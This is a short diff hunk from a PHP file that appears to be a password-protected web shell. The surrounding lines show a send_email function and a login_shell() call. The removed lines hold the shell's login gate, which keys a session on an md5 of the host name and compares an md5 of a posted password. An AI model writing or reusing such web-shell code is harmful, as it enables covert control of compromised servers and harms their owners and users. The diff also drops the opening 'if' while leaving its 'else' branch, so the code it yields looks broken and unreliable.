@@ -134,16 +134,7 @@ function send_email($email, $server, $path, $password) {
 
 // **Flush output after HTML is displayed**
 ob_end_flush();
-?>
 
-<?php
-    exit;
-}
-
-// Check if the user is logged in
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     } else {
         login_shell();
     }
